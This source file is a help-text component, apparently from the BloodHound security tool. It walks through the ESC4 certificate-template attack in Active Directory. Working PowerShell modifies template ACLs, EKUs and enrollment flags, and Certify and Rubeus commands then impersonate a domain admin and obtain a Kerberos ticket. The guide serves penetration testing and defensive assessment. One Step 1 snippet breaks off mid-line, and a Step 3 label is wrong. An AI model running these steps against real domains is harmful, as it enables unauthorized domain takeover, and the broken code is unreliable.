// Copyright 2024 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';
import { useHelpTextStyles } from '../utils';
import CodeController from '../CodeController/CodeController';

const WindowsAbuse: FC = () => {
    const classes = useHelpTextStyles();
    const step0_1 = (
        <>
            <Typography variant='body2'>
                <b>Step 0.1: </b>Obtain ownership (WriteOwner only)
                <br />
                <br />
                If you only have WriteOwner on the affected certificate template, then you need to grant your principal
                ownership over the template.
                <br />
                <br />
                Use the following PowerShell snippet to check the current ownership on the certificate template:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Print the owner
                $acl = $template.psbase.ObjectSecurity
                $acl.Owner`}
            </CodeController>
            <Typography variant='body2'>
                Use the following PowerShell snippet to grant the principal ownership on the certificate template:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Set owner
                $acl = $template.psbase.ObjectSecurity
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $acl.SetOwner($account)
                $template.psbase.CommitChanges()`}
            </CodeController>
            <Typography variant='body2'>
                Confirm that the ownership was changed by running the first script again
                <br />
                <br />
                After abuse, set the ownership back to previous owner using the second script.
            </Typography>
        </>
    );

    const step0_2 = (
        <>
            <Typography variant='body2'>
                <b>Step 0.2: </b>Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)
                <br />
                <br />
                If you only have WriteOwner, Owns, or WriteDacl on the affected certificate template, then you need to
                grant your principal GenericAll over the template.
                <br />
                <br />
                Use the following PowerShell snippet to grant the principal GenericAll on the certificate template:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Construct the ACE
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                    [System.Security.AccessControl.AccessControlType]::Allow
                )
                
                # Add the new ACE to the ACL
                $acl = $template.psbase.ObjectSecurity
                $acl.AddAccessRule($ace)
                $template.psbase.CommitChanges()`}
            </CodeController>
            <Typography variant='body2'>Confirm that the GenericAll ACE was added:</Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Print ACEs granted to the principal
                $acl = $template.psbase.ObjectSecurity
                $acl.Access | ? { $_.IdentityReference -like "*$principalName" }`}
            </CodeController>
            <Typography variant='body2'>After abuse, remove the GenericAll ACE you added:</Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Construct the ACE
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                    [System.Security.AccessControl.AccessControlType]::Allow
                )
                
                # Remove the ACE from the ACL
                $acl = $template.psbase.ObjectSecurity
                $acl.RemoveAccessRuleSpecific($ace)
                $template.psbase.CommitChanges()`}
            </CodeController>
        </>
    );

    const step1 = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 1: </b>Ensure the certificate template allows for client authentication.
                <br />
                <br />
                The certificate template allows for client authentication if the CertTemplate node's{' '}
                <em>Authentication Enabled</em> (<code>authenticationenabled</code>) is set to True. In that case,
                continue to the next step.
                <br />
                <br />
                Use the following PowerShell snippet to check the values of the <code>
                    pKIExtendedKeyUsage
                </code> and <code>msPKI-Certificate-Application-Policy</code> attributes of the certificate template:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Print attributes
                Write-Host "pKIExtendedKeyUsage: $($template.Properties["pKIExtendedKeyUsage"])"
                Write-Host "msPKI-Certificate-Application-Policy: $($template.Pro`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
                principal.
                <br />
                <br />
                Add the Client Authentication EKU:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Add EKU to attributes
                $template.Properties["pKIExtendedKeyUsage"].Add($eku) | Out-Null
                $template.Properties["msPKI-Certificate-Application-Policy"].Add($eku) | Out-Null
                $template.CommitChanges()
                $ldap.Close()`}
            </CodeController>
            <Typography variant='body2'>
                Run the first PowerShell snippet again to confirm the EKU has been added.
                <br />
                <br />
                After abuse, remove the Client Authentication EKU:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Remove EKU from attributes
                $template.Properties["pKIExtendedKeyUsage"].Remove($eku) | Out-Null
                $template.Properties["msPKI-Certificate-Application-Policy"].Remove($eku) | Out-Null
                $template.CommitChanges()
                $ldap.Close()`}
            </CodeController>
            <Typography variant='body2'>Verify the EKU has been removed using the first PowerShell snippet.</Typography>
        </>
    );

    const step2 = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 2: </b>Ensure the certificate template requires enrollee to specify Subject Alternative Name
                (SAN).
                <br />
                <br />
                The certificate template requires the enrollee to specify SAN if the CertTemplate node's{' '}
                <em>Enrollee Supplies Subject</em> (<code>enrolleesuppliessubject</code>) is set to True. In that case,
                continue to the next step.
                <br />
                <br />
                The certificate template requires the enrollee to specify SAN if the{' '}
                <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag is enabled in the certificate template's{' '}
                <code>msPKI-Certificate-Name-Flag</code> attribute. Use the following PowerShell snippet to check the
                value of the <code>msPKI-Certificate-Name-Flag</code> attribute of the certificate template and its
                enabled flags:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name

                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                $msPKICertificateNameFlag = $template.Properties["msPKI-Certificate-Name-Flag"]
                $ldap.Close()
                
                # Print attribute value and enabeld flags
                $flagTable = @{
                    0x00000001 = "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"
                    0x00010000 = "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME"
                    0x00400000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS"
                    0x00800000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_SPN"
                    0x01000000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID"
                    0x02000000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_UPN"
                    0x04000000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL"
                    0x08000000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_DNS"
                    0x10000000 = "CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN"
                    0x20000000 = "CT_FLAG_SUBJECT_REQUIRE_EMAIL"
                    0x40000000 = "CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME"
                    0x80000000 = "CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH"
                    0x00000008 = "CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME"
                }
                Write-Host "msPKI-Certificate-Name-Flag: $msPKICertificateNameFlag"
                foreach ($flag in $flagTable.Keys) {
                    if ($msPKICertificateNameFlag.ToString() -band $flag) {
                        Write-Host "0x$("{0:X8}" -f $flag) $($flagTable[$flag])"
                    }
                }`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                Flip the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $flagToFlip = 0x00000001         # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Flip flag
                $curValue = $template.Properties["msPKI-Certificate-Name-Flag"].Value
                $template.Properties["msPKI-Certificate-Name-Flag"].Value = $curValue -bxor $flagToFlip
                $template.CommitChanges()
                $ldap.Close()`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
                principal.
                <br />
                <br />
                Run the first PowerShell snippet again to confirm the <code>
                    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
                </code>{' '}
                flag has been enabled.
                <br />
                <br />
                After abuse, remove the flag by running the script that flips the flag once again.
            </Typography>
        </>
    );

    const step3 = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 3: </b>Ensure the certificate template does not require manager approval.
                <br />
                <br />
                The certificate template does not require manager approval if the CertTemplate node's{' '}
                <em>Requires Manager Approval</em> (<code>requiresmanagerapproval</code>) is set to False. In that case,
                continue to the next step.
                <br />
                <br />
                The certificate template requires manager approval if the <code>CT_FLAG_PEND_ALL_REQUESTS</code> flag is
                enabled in the certificate template's <code>msPKI-Enrollment-Flag</code> attribute. Use the following
                PowerShell snippet to check the value of the <code>msPKI-Enrollment-Flag</code> attribute of the
                certificate template and its enabled flags:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                $msPKICertificateNameFlag = $template.Properties["msPKI-Enrollment-Flag"]
                $ldap.Close()
                
                # Print attribute value and enabeld flags
                $flagTable = @{
                    0x00000001 = "CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS"
                    0x00000002 = "CT_FLAG_PEND_ALL_REQUESTS"
                    0x00000004 = "CT_FLAG_PUBLISH_TO_KRA_CONTAINER"
                    0x00000008 = "CT_FLAG_PUBLISH_TO_DS"
                    0x00000010 = "CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE"
                    0x00000020 = "CT_FLAG_AUTO_ENROLLMENT"
                    0x00000040 = "CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT"
                    0x00000100 = "CT_FLAG_USER_INTERACTION_REQUIRED"
                    0x00000400 = "CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE"
                    0x00000800 = "CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF"
                    0x00001000 = "CT_FLAG_ADD_OCSP_NOCHECK"
                    0x00002000 = "CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL"
                    0x00004000 = "CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS"
                    0x00008000 = "CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS"
                    0x00010000 = "CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT"
                    0x00020000 = "CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST"
                    0x00040000 = "CT_FLAG_SKIP_AUTO_RENEWAL"
                    0x00080000 = "CT_FLAG_NO_SECURITY_EXTENSION"
                }
                Write-Host "msPKI-Certificate-Name-Flag: $msPKICertificateNameFlag"
                foreach ($flag in $flagTable.Keys) {
                    if ($msPKICertificateNameFlag.ToString() -band $flag) {
                        Write-Host "0x$("{0:X8}" -f $flag) $($flagTable[$flag])"
                    }
                }`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                Flip the <code>CT_FLAG_PEND_ALL_REQUESTS</code> flag:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $flagToFlip = 0x00000002         # CT_FLAG_PEND_ALL_REQUESTS
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Flip flag
                $curValue = $template.Properties["msPKI-Enrollment-Flag"].Value
                $template.Properties["msPKI-Enrollment-Flag"].Value = $curValue -bxor $flagToFlip
                $template.CommitChanges()
                $ldap.Close()`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
                principal.
                <br />
                <br />
                Run the first PowerShell snippet again to confirm the <code>CT_FLAG_PEND_ALL_REQUESTS</code> flag has
                been enabled.
                <br />
                <br />
                After abuse, remove the flag by running the script that flips the flag once again.
            </Typography>
        </>
    );
    const step4 = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 4: </b>Ensure the certificate template does not require authorized signatures.
                <br />
                <br />
                The certificate template does not require authorized signatures if the CertTemplate node's{' '}
                <em>Authorized Signatures Required</em> (<code>authorizedsignatures</code>) is set to 0 or if the{' '}
                <em>Schema Version</em> (<code>schemaversion</code>) is 1. In that case, continue to the next step.
                <br />
                <br />
                The certificate template requires authorized signatures if the certificate template's{' '}
                <code>msPKI-RA-Signature</code> attribute value is more than zero. Use the following PowerShell snippet
                to check the value of the <code>msPKI-RA-Signature</code> attribute:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Print attribute
                Write-Host "msPKI-RA-Signature: $($template.Properties["msPKI-RA-Signature"])"
                $ldap.Close()`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                Set <code>msPKI-RA-Signature</code> to 0:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $noSignatures = [Int32]0
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Set No. of authorized signatures required
                $template.Properties["msPKI-RA-Signature"].Value = $noSignatures
                $template.CommitChanges()
                $ldap.Close()`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
                principal.
                <br />
                <br />
                Run the first PowerShell snippet again to confirm the <code>msPKI-RA-Signature</code> attribute has been
                set.
                <br />
                <br />
                After abuse, set the <code>msPKI-RA-Signature</code> attribute back to the original value by running
                PowerShell snippet that sets the value, but with the original value instead of 0.
            </Typography>
        </>
    );
    const step5 = (
        <>
            <Typography variant='body2'>
                <b>Step 5: </b>Ensure the principal has enrollment rights on the certificate template.
                <br />
                <br />
                The principal does have enrollment rights on the certificate template if BloodHound returns a path for
                this Cypher query (replace <code>"PRINCIPAL@DOMAIN.NAME"</code> and{' '}
                <code>"CERTTEMPLATE@DOMAIN.NAME"</code> with the names of the principal and the certificate template):
            </Typography>
            <CodeController>
                {`MATCH p = (x)-[:MemberOf*0..]->()-[:Enroll|AllExtendRights|GenericAll]->(ct:CertTemplate)
                WHERE x.name = "PRINCIPAL@DOMAIN.NAME" AND ct.name = "CERTTEMPLATE@DOMAIN.NAME"
                RETURN p`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                If a path is returned, continue to the next step.
                <br />
                <br />
                Use the following PowerShell snippet to grant the principal Enroll on the certificate template:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Construct the ACE
                $objectTypeByteArray = [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
                $inheritedObjectTypeByteArray = [GUID]"00000000-0000-0000-0000-000000000000"
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $sid     = $account.Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $objectTypeByteArray,
                    [System.Security.AccessControl.InheritanceFlags]::None,
                    $inheritedObjectTypeByteArray
                )
                
                # Add the new ACE to the ACL
                $acl = $template.psbase.ObjectSecurity
                $acl.AddAccessRule($ace)
                $template.psbase.CommitChanges()`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                Confirm that the Enroll ACE was added:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Print ACEs granted to the principal
                $acl = $template.psbase.ObjectSecurity
                $acl.Access | ? { $_.IdentityReference -like "*$principalName" }`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                After abuse, remove the Enroll ACE you added:
            </Typography>
            <CodeController>
                {`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Construct the ACE
                $objectTypeByteArray = [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
                $inheritedObjectTypeByteArray = [GUID]"00000000-0000-0000-0000-000000000000"
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $sid     = $account.Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $objectTypeByteArray,
                    [System.Security.AccessControl.InheritanceFlags]::None,
                    $inheritedObjectTypeByteArray
                )
                
                # Remove the ACE from the ACL
                $acl = $template.psbase.ObjectSecurity
                $acl.RemoveAccessRuleSpecific($ace)
                $template.psbase.CommitChanges()`}
            </CodeController>
            <Typography variant='body2'>
                The principal can now perform an ESC1 attack with the following steps:
            </Typography>
        </>
    );

    const step6 = (
        <>
            <Typography variant='body2'>
                <b>Step 6</b>: Use Certify to request enrollment in the affected template, specifying the affected
                certification authority and target principal to impersonate:
            </Typography>
            <CodeController>
                {
                    'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC1" /altname:forestroot\\ForestRootDA'
                }
            </CodeController>
            <Typography variant='body2'>Save the certificate as cert.pem and the private key as cert.key.</Typography>
        </>
    );

    const step7 = (
        <>
            <Typography variant='body2'>
                <b>Step 7</b>: Convert the emitted certificate to PFX format:
            </Typography>
            <CodeController hideWrap>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</CodeController>
        </>
    );

    const step8 = (
        <>
            <Typography variant='body2'>
                <b>Step 8</b>: Optionally purge all kerberos tickets from memory:
            </Typography>
            <CodeController hideWrap>{'klist purge'}</CodeController>
        </>
    );
    const step9 = (
        <>
            <Typography variant='body2'>
                <b>Step 9</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
                target identity to impersonate and the PFX-formatted certificate created in Step 7:
            </Typography>
            <CodeController>
                {'Rubeus asktgt /user:"forestroot\\forestrootda" /certificate:cert.pfx /password:asdf /ptt'}
            </CodeController>
        </>
    );
    const step10 = (
        <>
            <Typography variant='body2'>
                <b>Step 10</b>: Optionally verify the TGT by listing it with the klist command:
            </Typography>
            <CodeController hideWrap>{'klist'}</CodeController>
        </>
    );

    return (
        <>
            <Typography variant='body2'>An attacker may perform the ESC4 attack with the following steps.</Typography>
            {step0_1}
            {step0_2}
            {step1}
            {step2}
            {step3}
            {step4}
            {step5}
            {step6}
            {step7}
            {step8}
            {step9}
            {step10}
        </>
    );
};

export default WindowsAbuse;
